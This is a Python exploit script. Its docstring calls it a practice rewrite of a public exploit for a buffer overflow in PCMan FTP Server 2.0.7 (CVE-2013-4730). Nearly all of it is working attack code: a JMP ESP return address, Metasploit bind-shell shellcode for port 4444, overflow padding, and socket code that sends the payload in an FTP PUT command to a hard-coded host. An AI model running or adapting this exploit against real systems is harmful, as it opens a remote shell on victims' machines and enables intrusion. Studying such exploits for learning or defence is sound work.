'''
This script is a rewrite of the CVE-2013-4730 exploit for PCMan FTP Server 2.0.7
In no way did I discover this exploit, I just went through the exploitation steps as practise.
A blog post about going through said steps can be found on netseclife.com
'''

import socket

def main():

    #Found commands (All modules), item 61
    #Address=7E429353
    #Disassembly=JMP ESP
    #Module Name=C:\WINDOWS\system32\USER32.dll
    RET = "\x53\x93\x42\x7e"

    #msfpayload windows/shell_bind_tcp LPORT=4444 R| msfencode -b '\x00\x0A\x0D' -t c -e x86/shikata_ga_nai
    SHELLCODE = (
    "\xda\xdb\xd9\x74\x24\xf4\xbf\xd5\xde\x13\x14\x5b\x29\xc9\xb1"
    "\x56\x31\x7b\x18\x83\xeb\xfc\x03\x7b\xc1\x3c\xe6\xe8\x01\x49"
    "\x09\x11\xd1\x2a\x83\xf4\xe0\x78\xf7\x7d\x50\x4d\x73\xd3\x58"
    "\x26\xd1\xc0\xeb\x4a\xfe\xe7\x5c\xe0\xd8\xc6\x5d\xc4\xe4\x85"
    "\x9d\x46\x99\xd7\xf1\xa8\xa0\x17\x04\xa8\xe5\x4a\xe6\xf8\xbe"
    "\x01\x54\xed\xcb\x54\x64\x0c\x1c\xd3\xd4\x76\x19\x24\xa0\xcc"
    "\x20\x75\x18\x5a\x6a\x6d\x13\x04\x4b\x8c\xf0\x56\xb7\xc7\x7d"
    "\xac\x43\xd6\x57\xfc\xac\xe8\x97\x53\x93\xc4\x1a\xad\xd3\xe3"
    "\xc4\xd8\x2f\x10\x79\xdb\xeb\x6a\xa5\x6e\xee\xcd\x2e\xc8\xca"
    "\xec\xe3\x8f\x99\xe3\x48\xdb\xc6\xe7\x4f\x08\x7d\x13\xc4\xaf"
    "\x52\x95\x9e\x8b\x76\xfd\x45\xb5\x2f\x5b\x28\xca\x30\x03\x95"
    "\x6e\x3a\xa6\xc2\x09\x61\xaf\x27\x24\x9a\x2f\x2f\x3f\xe9\x1d"
    "\xf0\xeb\x65\x2e\x79\x32\x71\x51\x50\x82\xed\xac\x5a\xf3\x24"
    "\x6b\x0e\xa3\x5e\x5a\x2e\x28\x9f\x63\xfb\xff\xcf\xcb\x53\x40"
    "\xa0\xab\x03\x28\xaa\x23\x7c\x48\xd5\xe9\x0b\x4e\x1b\xc9\x58"
    "\x39\x5e\xed\x4f\xe5\xd7\x0b\x05\x05\xbe\x84\xb1\xe7\xe5\x1c"
    "\x26\x17\xcc\x30\xff\x8f\x58\x5f\xc7\xb0\x58\x75\x64\x1c\xf0"
    "\x1e\xfe\x4e\xc5\x3f\x01\x5b\x6d\x49\x3a\x0c\xe7\x27\x89\xac"
    "\xf8\x6d\x79\x4c\x6a\xea\x79\x1b\x97\xa5\x2e\x4c\x69\xbc\xba"
    "\x60\xd0\x16\xd8\x78\x84\x51\x58\xa7\x75\x5f\x61\x2a\xc1\x7b"
    "\x71\xf2\xca\xc7\x25\xaa\x9c\x91\x93\x0c\x77\x50\x4d\xc7\x24"
    "\x3a\x19\x9e\x06\xfd\x5f\x9f\x42\x8b\xbf\x2e\x3b\xca\xc0\x9f"
    "\xab\xda\xb9\xfd\x4b\x24\x10\x46\x7b\x6f\x38\xef\x14\x36\xa9"
    "\xad\x78\xc9\x04\xf1\x84\x4a\xac\x8a\x72\x52\xc5\x8f\x3f\xd4"
    "\x36\xe2\x50\xb1\x38\x51\x50\x90")

    buffer = "A" * 2008 + RET + "\x90" * 20 + SHELLCODE

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect(('192.168.1.101',21))
    s.recv(1024)
    s.send('USER anonymous\r\n')
    s.recv(1024)
    s.send('PASS anonymous\r\n')
    s.recv(1024)
    s.send('PUT' + buffer + '\r\n')
    s.close()

main()
